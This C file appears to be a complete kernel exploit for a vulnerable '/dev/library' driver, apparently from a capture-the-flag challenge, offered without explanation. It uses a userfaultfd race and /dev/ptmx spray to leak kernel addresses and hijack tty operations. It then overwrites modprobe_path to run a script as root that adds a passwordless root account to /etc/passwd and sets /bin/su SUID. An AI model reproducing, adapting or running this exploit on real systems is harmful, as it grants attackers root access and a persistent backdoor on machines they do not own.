#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include "userfault.h"
#include "tty.h"

#define PAGE_SIZE 0x1000
#define logInfo(...) do{ \
    fprintf(stderr,"[*] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
}while(0)
#define logErr(...) do{ \
    fprintf(stderr,"[!] "); \
    fprintf(stderr,__VA_ARGS__); \
    fputc('\n',stderr); \
}while(0)
#define errExit(...) do{ \
    logErr(__VA_ARGS__); \
    fprintf(stderr,": %s",strerror(errno)); \
    exit(-1); \
}while(0)
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        logErr("NO ROOT");
    }
    logInfo("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    logInfo("Saved user state");
}
#define DEVICE_FILE "/dev/library"

#define BOOK_DESCRIPTION_SIZE 0x300

#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004

struct Book {
	char book_description[BOOK_DESCRIPTION_SIZE];
	unsigned long index;
	struct Book* next;
	struct Book* prev;
};

struct Request {
	unsigned long index;
	char *userland_pointer;
};

int devfd;

void opendev(){
    devfd = open(DEVICE_FILE,O_RDWR);
    if(devfd < 0)
        errExit("Open "DEVICE_FILE);
    logInfo("Open "DEVICE_FILE);
}

int64_t add_book(uint64_t index){
    struct Request req = {0};
    req.index = index;
    return ioctl(devfd,CMD_ADD,&req);
}

int64_t remove_book(uint64_t index){
    struct Request req = {0};
    req.index = index;
    return ioctl(devfd,CMD_REMOVE,&req);    
}

int64_t get_book_description(uint64_t index, char* data){
    struct Request req = {0};
    req.index = index;
    req.userland_pointer = data;
    return ioctl(devfd,CMD_GET_DESC,&req);
}

int64_t add_book_description(uint64_t index, const char* data){
    struct Request req = {0};
    req.index = index;
    req.userland_pointer = (char *)data;
    return ioctl(devfd,CMD_ADD_DESC,&req);
}

int64_t remove_all(){
    struct Request req = {0};
    return ioctl(devfd,CMD_REMOVE_ALL,&req);
}

int ptmx_fd;

void stage1(){
    logInfo("Executing stage1 ...");
    if(remove_all())
        errExit("remove_all");
    // for(uint64_t i = 0 ; i < 0x20 ; ++i){
    if( ( ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY) ) == -1 )
        errExit("ptmx spray");
    // }
    logInfo("Stage1 done!");
}
uint64_t heap_addr ;
uint64_t _text ;

void stage2(){
    logInfo("Executing stage2 ...");
    if(remove_all()){
        errExit("remove_all");
    }

    memcpy(uf_buffer,(void *)0x1337000,0x18);
    *(uint64_t *)&uf_buffer[offsetof(struct tty_operations,ioctl)] = _text + 0x13e9b1; // mov DWORD PTR [rdx],esi ; ret
    *(uint64_t *)&uf_buffer[0x18] = heap_addr;

    if( ( ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY) ) == -1 )
        errExit("ptmx spray");
    
    logInfo("Stage2 done!");
}

int main(int argc,char** argv,char** envp){
    pthread_t th;

    opendev();

    add_book(0);
    register_ufd(0x1337000);
    pthread_create(&th, NULL, (void *)race_userfault, stage1);
    get_book_description(0,(void *)0x1337000);

    char* leaker = (void *)0x1337000;
    heap_addr = *(uint64_t *)&leaker[0x38] - 0x38;
    _text     = *(uint64_t *)&leaker[0x18] - 0x623560;

    logInfo("Heap chunk: 0x%lx",heap_addr);
    logInfo("Text: 0x%lx", _text);

    close(ptmx_fd);

    add_book(0);
    register_ufd(0x1338000);
    pthread_create(&th, NULL, (void *)race_userfault, stage2);
    add_book_description(0,(void *)0x1338000);

    uint32_t* inject = (uint32_t *)"/tmp/vjp\0";
    uint64_t modprobe_path = _text + 0x837d00;
    for(uint16_t i = 0 ; i < 3 ; ++i)
        ioctl(ptmx_fd,inject[i],modprobe_path+4*i);
    
    system("echo -e \""
            "#!/bin/sh\n"
            "echo 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\n"
            "/bin/chmod +s /bin/su\n"
            "\" > /tmp/vjp");
    chmod("/tmp/vjp",0777);
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    chmod("/tmp/pwn",0777);
    system("/tmp/pwn");  // trigger call modprobe_path
    system("grep vjp /etc/passwd" );
    system("su vjp");


}